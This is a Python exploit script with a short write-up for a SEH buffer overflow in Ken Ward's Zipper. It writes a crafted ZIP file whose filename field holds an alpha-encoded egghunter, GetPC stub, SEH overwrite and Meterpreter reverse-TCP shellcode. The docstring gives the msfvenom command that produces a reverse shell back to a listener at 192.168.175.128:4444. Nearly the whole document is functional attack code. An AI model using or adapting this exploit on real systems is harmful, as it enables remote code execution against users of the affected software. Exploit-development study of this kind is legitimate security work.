from binascii import unhexlify

"""
Ken Ward Zipper Buffer Overflow

,-----------------------------------------------.
    | Comparison results:                           |
    |-----------------------------------------------|
  0 |01 02 03 04 05 06 07 08 09 0b 0c 0e 0f 10 11 12| File
    |                                    a4         | Memory
 10 |13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 23| File
    |   b6 a7                                       | Memory
 20 |24 25 26 27 28 29 2b 2c 2d 2e 30 31 32 33 34 35| File
    |                                               | Memory
 30 |36 37 38 39 3b 3d 40 41 42 43 44 45 46 47 48 49| File
    |                                               | Memory
 40 |4a 4b 4c 4d 4e 4f 50 51 52 53 54 55 56 57 58 59| File
    |                                               | Memory
 50 |5a 5b 5d 5e 5f 60 61 62 63 64 65 66 67 68 69 6a| File
    |                                               | Memory
 60 |6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a| File
    |                                               | Memory
 70 |7b 7d 7e 7f 80 81 82 83 84 85 86 87 88 89 8a 8b| File
    |            c7 fc e9 e2 e4 e0 e5 e7 ea eb e8 ef| Memory
 80 |8c 8d 8e 8f 90 91 92 93 94 95 96 97 98 99 9a 9b| File
    |ee ec c4 c5 c9 e6 c6 f4 f6 f2 fb f9 ff d6 dc a2| Memory
 90 |9c 9d 9e 9f a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab| File
    |a3 a5 50 83 e1 ed f3 fa f1 d1 aa ba bf ac ac bd| Memory
 a0 |ac ad ae af b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb| File
    |bc a1 ab bb a6 a6 a6 a6 a6 a6 a6 2b 2b a6 a6 2b| Memory
 b0 |bc bd be bf c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb| File
    |2b 2b 2b 2b 2b 2d 2d 2b 2d 2b a6 a6 2b 2b 2d 2d| Memory
 c0 |cc cd ce cf d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db| File
    |a6 2d 2b 2d 2d 2d 2d 2b 2b 2b 2b 2b 2b 2b 2b a6| Memory
 d0 |dc dd de df e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb| File
    |5f a6 a6 01 00 00 00 00 53 73 b5 74 46 54 4f 64| Memory
 e0 |ec ed ee ef f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb| File
    |38 66 65 6e 3d b1 3d 3d 28 29 f7 98 b0 b7 b7 76| Memory
 f0 |fc fd fe ff                                    | File
    |6e b2 a6 a0                                    | Memory
    `-----------------------------------------------'

Write-up : 
1. Filefuzz provided crash on 5000 bytes
2. MSF Pattern identified the offset as follows:
   - EIP  : 1022 : #0x0043443d : pop esi # pop ebx # ret 
   - NSEH : 1026
3. Bad Character are just managed and replace with alternet character. Why not reused.
4. Limited Buffer : 
	- Used short jmp back to 8 bytes (char -> eb f6 are mangled by x89 x94)
	- User long jmp back 200 bytes and placed the customer decoder / stack alined code along with egghunter (char reused -> ) 
	  	0012F7DC       EB 05            JMP SHORT 0012F7E3
		0012F7DE       5E               POP ESI
		0012F7DF       41               INC ECX
		0012F7E0       FFD6             CALL ESI
		0012F7E2       41               INC ECX
		0012F7E3       E8 F6FFFFFF      CALL 0012F7DE
5. Egghunter are alpha encoded with egg 'evil'
6. Shellcode : msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.175.128 LPORT=4444 EXITFUNC=seh BufferRegister=EDI -e x86/alpha_mixed

"""

shellcode = "evilevil" + "WYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIylhhK2UPC0c0cPMYiuDq9Pe4lKBptpLKpRTLLK62B4NkSBa8Voh7RjevVQIollEle11lC2VLq0ZahO4Mc1Zg8bhrV2CgNk3btPlKRjgLlK2ltQahysrhuQkacaLK3igPWq9CLKQYEHJCwJ79LK04lKuQ9FVQIoNLZaxOTMuQYWgH9pPuIfGs1ml85kQm7TQeXdv8nk68vD31yCRFLKDLPKlKShuLGqn3nkFdNk7qn0OyctetfD1KskaqciQJF19oYpaOqOBzlKvrHkLMqMcXGCfRwpWpe82WQcub3obtE82lbWQ6fgK9yxioxPH8Z0s1s0gpdiYTRt2pRHfIK0BKuPIoIECZ5Z3X9PoXloMP2H5RuPtQaLNiXff0v0v0BpSpv0sp2pu8JJ6oiOKPioIEMGqzvpCfaG3Xj9mu2TSQIokeLEkpad5ZIornWxBUhlHh2GUPEPwp1zgp3ZETbv1GrHuRIIxHQO9o9EMSyhuPcN4vLKuf3Z7058EP20uP30F6sZUPrHQHoTPS9uKOzunsccRJuPsff3SgPhdBiIzhqOKOIEK3JXUP3Muxv82HS03puPuPazWp2pRHTKVO4OVP9oke67cXRUrN0M3QkOIEqNaNio6l7T6olEBP9okOIoximK9oIoYoGqo3Ti8FaejaXCMk9nFnwBKZsZEPF3IojucZc0HCAA"

egg = "VYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIU6k18J9ovow2pRBJC2rxxMvNUlguQJBTHoNXSU4659RLNkjZNOaeZJnO0uKWkOM7A"

#alphanum GetPC code
getpc = "\x89\x05\x5e\x41\x98\x99\x41\x8a\x94\x98\x98\x98"

#short back jmp : eb f6 -> converted to x89 x94
seh = "\x89\x94\x41\x41"

#0x0043443d : pop esi # pop ebx # ret  | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [zip4.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Ken Ward's Zipper\zip4.exe)
eip = "\x3d\x44\x43\x00"

#long jmp : E933FFFFFF
backjmp = "\x82\x38\x98\x98\x98"

# Building zip file structure
# It is important to keep the getpc and egg together
buff = '\x41' * 822 + getpc +  egg + 'A' * (1022 - (822 + len(getpc) + len(egg) + len(backjmp))) + backjmp

# final payload
payload = buff + seh + eip + shellcode + 'D' * (4000 - (1028 + len(shellcode)))


payloadLength = len(payload)

payloadLengthhex = format(payloadLength,'#06x')

payloadLengthByte1 = unhexlify(payloadLengthhex[2:4])
payloadLengthByte2 = unhexlify(payloadLengthhex[4:6])

sizeCD = format(46+payloadLength,'#06x')

sizeCDByte1 = unhexlify(sizeCD[2:4]) 
sizeCDByte2 = unhexlify(sizeCD[4:6])

offsetCD = format(30+payloadLength,'#06x')

offsetCDByte1 = unhexlify(offsetCD[2:4])
offsetCDByte2 = unhexlify(offsetCD[4:6])

lf_header = "\x50\x4B\x03\x04" 							# Local file header signature
lf_header += "\x00\x00"  	   							# Version needed to extract (minimum)
lf_header += "\x00\x00"									# General purpose bit flag
lf_header += "\x00\x00"									# Compression method
lf_header += "\x6E\x3F"									# File last modification time	
lf_header += "\xC3\x4E"									# File last modification date
lf_header += "\x00\x00\x00\x00"							# CRC-32
lf_header += "\x00\x00\x00\x00"							# Compressed size
lf_header += "\x00\x00\x00\x00"							# Uncompressed size
lf_header += payloadLengthByte2 + payloadLengthByte1 	# file size  - DYNAMIC
lf_header +="\x00\x00"									# Extra field length

cdf_header = "\x50\x4B\x01\x02"							# Central directory file header signature
cdf_header += "\x14\x00"								# Version made by
cdf_header += "\x00\x00"								# Version needed to extract (minimum)
cdf_header += "\x00\x00"								# General purpose bit flag
cdf_header += "\x00\x00"								# Compression method
cdf_header += "\x6E\x3F"								# File last modification time
cdf_header += "\xC3\x4E"								# File last modification date
cdf_header += "\x00\x00\x00\x00"						# CRC-32
cdf_header += "\x00\x00\x00\x00" 						# Compressed size
cdf_header += "\x00\x00\x00\x00"						# Uncompressed size
cdf_header += payloadLengthByte2 + payloadLengthByte1 	# file size - DYNAMIC
cdf_header += "\x00\x00"								# Extra field length
cdf_header += "\x00\x00" 								# File comment length 
cdf_header += "\x00\x00"								# Disk number where file starts
cdf_header += "\x00\x00"								# Internal file attributes
cdf_header += "\x20\x00\x00\x00"						# External file attributes
cdf_header += "\x00\x00\x00\x00"						# Relative offset of local file header

eofcdf_header = "\x50\x4B\x05\x06"						# End of central directory signature
eofcdf_header += "\x00\x00"								# Number of this disk
eofcdf_header += "\x00\x00"								# Disk where central directory starts
eofcdf_header += "\x01\x00"								# Number of central directory records on this disk
eofcdf_header += "\x01\x00"								# Total number of central directory records
eofcdf_header += sizeCDByte2 + sizeCDByte1 + "\x00\x00" # Size of central directory (bytes) - DYNAMIC
eofcdf_header += offsetCDByte2 +  offsetCDByte1 + "\x00\x00" # Offset of start of central directory, relative to start of archive - DYNAMIC
eofcdf_header +="\x00\x00"								# Comment length 



filename= "zoo.zip"	
print "Creating " + filename + " file \n";
zipfile = open(filename,'w')
zipfile.write(lf_header + payload + cdf_header + payload + eofcdf_header)
zipfile.close()
